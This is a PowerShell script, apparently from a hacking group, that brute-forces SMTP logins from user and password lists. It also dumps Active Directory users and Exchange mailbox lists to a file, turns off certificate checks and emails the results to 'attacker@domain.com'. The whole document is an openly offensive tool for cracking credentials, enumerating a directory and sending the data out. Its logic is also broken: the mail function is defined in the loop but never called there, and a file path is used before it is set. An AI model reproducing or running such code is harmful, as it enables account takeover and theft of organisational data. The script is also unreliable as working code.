import-module ActiveDirectory

function whoAmi {
    param(
        [string]$Message
    )

    Write-Host "Message: $Message"
}

whoAmi "DZLAB ELMO9AWIM =============== SMTP - BRUTER ================= $(get-date -f MM-dd)"
whoAmi -message "[START] = HACKING ITS FUN @DZHACKTEAM"

function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output ("{0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message "START --------------- HACKING"

$userlist = "users.txt";
$passlist = "passwords.txt";


foreach($USER in [System.IO.File]::ReadLines($userlist))
{
       
       foreach($PASS in [System.IO.File]::ReadLines($passlist))
       {
       
            Get-ADUser -Filter * -Properties EmailAddress,DisplayName, samaccountname| select EmailAddress, DisplayName | Out-File -FilePath $path;
                                      

            $username = $USER;
            $password = $PASS;
            $path = "C:\poc$(get-date -f MM-dd).txt";

            function Send-ToEmail([string]$email, [string]$attachmentpath){

                  $message = new-object Net.Mail.MailMessage;
                  $message.From = "$username@domain.com";
                  $message.To.Add($email);
                  $message.Subject = "POC ON $username";
                  $message.Body = "";
                  $attachment = New-Object Net.Mail.Attachment($attachmentpath);
                  $message.Attachments.Add($attachment);
                  $smtp = new-object Net.Mail.SmtpClient("smtp.domain.com");
                  $smtp.EnableSSL = $true;
                  $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password);
                  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { return $true }
                  $smtp.send($message);
                  write-host "Mail Sent" ;
                  write-host "CRACKED USER ACESSS ----- $username:$password";
                  "CRACKED USER ACESSS ----- $username:$password" | Out-File -FilePath $path;
                  Get-ADUser -Filter * -Properties * | Select Name, DisplayName, SamAccountName, UserPrincipalName | Out-File -FilePath $path;
                  Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress | Sort-Object DisplayName | Out-File -FilePath $path;
                  Get-Mailbox -ResultSize Unlimited | Select-Object DisplayName,PrimarySmtpAddress, @{Name="EmailAddresses";Expression={($_.EmailAddresses | Where-Object {$_ -clike "smtp*"} | ForEach-Object {$_ -replace "smtp:",""}) -join ","}} | Sort-Object DisplayName | Out-File -FilePath $path;
                  Get-Recipient | Select DisplayName, RecipientType, EmailAddresses | Out-File -FilePath $path;
                  Get-ADUser -Filter * -Properties EmailAddress,DisplayName, samaccountname| select EmailAddress, DisplayName | Out-File -FilePath $path;
                  $attachment.Dispose();
                  Log-Message "DONE FOR [ $username:$password ]"
           }
           
       }
 }
 
Send-ToEmail  -email "attacker@domain.com" -attachmentpath $path;

Log-Message "JOB ------------------ END "
